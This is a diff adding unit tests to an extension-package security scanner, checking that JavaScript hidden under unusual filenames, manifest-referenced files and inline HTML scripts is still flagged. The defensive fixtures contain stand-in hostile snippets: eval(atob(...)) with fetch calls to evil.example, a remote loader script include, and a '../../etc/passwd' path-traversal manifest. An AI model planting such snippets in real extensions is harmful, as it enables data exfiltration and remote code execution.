@@ -581,3 +581,150 @@ def test_stored_defaults_backfills_a_sparse_stored_blob():
     assert sparse["uses_eval"] is False  # backfilled
     assert sparse["manifest_version"] == 2  # backfilled
     assert sparse["package_sha256"] == ""  # backfilled
+
+
+# --- #275: the code-behaviour scan must not be evadable by filename ------------
+
+
+def test_mjs_payload_is_scanned():
+    """The issue's headline case: a payload named `bg.mjs` used to score zero on
+    every code-behaviour and network signal — below an extension whose package
+    could not be downloaded at all, which gets the unknown-midpoint."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "bg.mjs": "eval(atob('x')); fetch('https://evil.example/collect');",
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_eval is True
+    assert result.uses_remote_code is True
+    assert "evil.example" in result.external_domains
+
+
+def test_cjs_payload_is_scanned():
+    """A VS Code extension's `main` is routinely `extension.cjs`."""
+    data = make_zip(
+        {
+            "extension/package.json": json.dumps(
+                {"name": "e", "version": "1", "contributes": {}, "main": "./out/extension.cjs"}
+            ),
+            "extension/out/extension.cjs": "eval('1');",
+        }
+    )
+    assert inspect_package(data).uses_eval is True
+
+
+def test_manifest_referenced_file_is_scanned_whatever_its_extension():
+    """Chrome loads whatever path the manifest names, so the manifest — not the
+    filename — is the authoritative list of what executes."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps(
+                {
+                    "manifest_version": 3,
+                    "name": "x",
+                    "version": "1",
+                    "background": {"service_worker": "core.dat"},
+                }
+            ),
+            "core.dat": "eval('payload'); fetch('https://evil.example/x');",
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_eval is True
+    assert "evil.example" in result.external_domains
+
+
+def test_manifest_referenced_content_script_is_scanned():
+    data = make_zip(
+        {
+            "manifest.json": json.dumps(
+                {
+                    "manifest_version": 3,
+                    "name": "x",
+                    "version": "1",
+                    "content_scripts": [{"matches": ["<all_urls>"], "js": ["/payload.bin"]}],
+                }
+            ),
+            "payload.bin": "new Function('x')();",
+        }
+    )
+    assert "new_function_usage" in _finding_codes(inspect_package(data))
+
+
+def test_manifest_path_cannot_escape_the_archive():
+    """A `..` segment is dropped rather than resolved — a manifest must not
+    reach outside its own package."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps(
+                {
+                    "manifest_version": 3,
+                    "name": "x",
+                    "version": "1",
+                    "background": {"service_worker": "../../etc/passwd"},
+                }
+            ),
+            "ok.js": "console.log(1);",
+        }
+    )
+    assert inspect_package(data).uses_eval is False  # no crash, nothing escaped
+
+
+def test_inline_script_in_background_page_is_scanned():
+    """An MV2 background page can carry its whole payload inline."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps(
+                {"manifest_version": 2, "name": "x", "version": "1", "background": {"page": "bg.html"}}
+            ),
+            "bg.html": "<html><body><script>eval('go'); fetch('https://evil.example/c');</script></body></html>",
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_eval is True
+    assert result.uses_remote_code is True
+    assert "evil.example" in result.external_domains
+
+
+def test_remote_script_include_in_packaged_page_is_flagged():
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
+            "popup.html": '<html><script src="https://evil.example/loader.js"></script></html>',
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_remote_code is True
+    assert "remote_script_include" in _finding_codes(result)
+    assert "evil.example" in result.external_domains
+
+
+def test_html_findings_report_the_line_in_the_page():
+    """Masking (rather than stripping) the markup keeps reported line numbers
+    pointing at real positions in the HTML file."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
+            "page.html": "<html>\n<body>\n<div>hi</div>\n<script>\neval('x');\n</script>\n</body>\n</html>",
+        }
+    )
+    finding = next(f for f in inspect_package(data).findings if f.code == "eval_usage")
+    assert finding.file == "page.html"
+    assert finding.line == 5
+
+
+def test_markup_only_html_does_not_trigger_js_heuristics():
+    """Guards the #151 false-positive class: a large minified page with no
+    inline script must not read as minified/obfuscated JavaScript."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "big.html": "<html><body>" + "<div class='a b c'>text</div>" * 400 + "</body></html>",
+        }
+    )
+    result = inspect_package(data)
+    assert result.has_minified_code is False
+    assert result.obfuscation_score == 0
+    assert _finding_codes(result) == set()
